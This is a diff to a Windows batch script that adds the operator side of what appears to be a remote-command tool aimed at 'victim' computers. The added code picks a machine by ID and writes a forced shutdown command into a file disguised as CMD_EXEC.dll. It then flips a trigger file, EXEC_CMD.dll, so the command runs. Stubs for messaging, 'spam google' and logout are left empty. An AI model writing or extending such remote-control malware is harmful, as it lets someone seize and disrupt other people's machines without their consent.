@@ -342,6 +342,61 @@ goto crash
 echo.
 set "Computer_ID_1="
 set /p "Computer_ID_1=!reset!!white_black!Computer id:!reset! "
+if exist "!FILE_Devices!\!Computer_ID_1!" (
+	echo !reset!!green!Success:!reset! Found computer [!Computer_ID_1!]
+	echo.
+	goto rce_pc_found
+) else (
+	echo !reset!!red_black!Error:!reset! Could not find computer [!Computer_ID_1!]
+	echo.
+	goto command_inp
+)
+goto crash
+
+:rce_pc_found
+set "VICTIM_CMD="
+set "VICTIM_SHUTDOWN_TIMER="
+echo !reset!!yellow!Type 'return' to return to main menu^^!!reset!
+set /p "VICTIM_CMD=!reset!!white_black!Enter Remote Command:!reset! "
+if "!VICTIM_CMD!" == "return" (
+	echo.
+	goto command_inp
+)
+if "!VICTIM_CMD!" == "shutdown" (
+	set /p "VICTIM_SHUTDOWN_TIMER=!reset!!green!Shutdown Seconds:!reset!!yellow![Type none for 0 seconds]!reset! "
+	if exist "!FILE_Devices!\!Computer_ID_1!\CMD_EXEC.dll" (
+		if "!VICTIM_SHUTDOWN_TIMER!" == "none" (
+			echo shutdown /s /t 0>"!FILE_Devices!\!Computer_ID_1!\CMD_EXEC.dll"
+		) else (
+			echo shutdown /s /t !VICTIM_SHUTDOWN_TIMER!>"!FILE_Devices!\!Computer_ID_1!\CMD_EXEC.dll"
+		)
+		if exist "!FILE_Devices!\!Computer_ID_1!\EXEC_CMD.dll" (
+			echo exec_now>"!FILE_Devices!\!Computer_ID_1!\EXEC_CMD.dll"
+			ping localhost -n 3 > nul
+			echo dont_exec>"!FILE_Devices!\!Computer_ID_1!\EXEC_CMD.dll"
+		) else (
+
+		)
+	) else (
+		echo !reset!!red_black!Error:!reset! Cannot find CMD_EXEC.dll, critical error^^!
+		echo.
+		goto rce_pc_found
+		goto crash
+	)
+)
+if "!VICTIM_CMD!" == "msg" (
+
+)
+if "!VICTIM_CMD!" == "spam google" (
+
+)
+if "!VICTIM_CMD!" == "logout" (
+
+)
+echo !reset!!red_black!Error:!reset! This command is invalid^^! [!VICTIM_CMD!]
+echo.
+goto rce_pc_found
+goto crash
 
 :crash
 cls
